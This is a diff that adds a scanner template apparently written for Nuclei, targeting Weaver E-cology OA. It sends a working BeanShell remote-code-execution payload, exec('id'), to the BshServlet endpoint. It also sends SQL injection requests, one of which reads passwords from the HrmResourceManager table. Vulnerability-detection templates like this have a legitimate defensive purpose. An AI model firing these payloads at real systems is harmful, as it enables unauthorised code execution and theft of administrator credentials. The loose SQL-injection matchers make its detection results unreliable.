@@ -1,0 +1,47 @@
+id: weaver-ecology-bsh-rce
+
+info:
+  name: 泛微OA(Weaver E-cology) - BeanShell RCE
+  author: bai-codeagent
+  severity: critical
+  description: |
+    泛微OA E-cology 系统存在 BeanShell 远程代码执行漏洞。
+    攻击者可通过 /weaver/bsh.servlet.BshServlet 执行任意Java代码。
+  reference:
+    - https://github.com/TD0U/WeaverScan
+  tags: weaver,oa,rce,cn-cms
+  metadata:
+    cnvd-applicable: true
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/weaver/bsh.servlet.BshServlet"
+      - "{{BaseURL}}/bsh.servlet.BshServlet"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'bsh.script=exec("id")'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+      - type: status
+        status:
+          - 200
+
+  # 泛微 SQL 注入
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
+      - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20from%20HrmResourceManager"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "password"
+          - "<"
+        condition: or
+      - type: status
+        status:
+          - 200
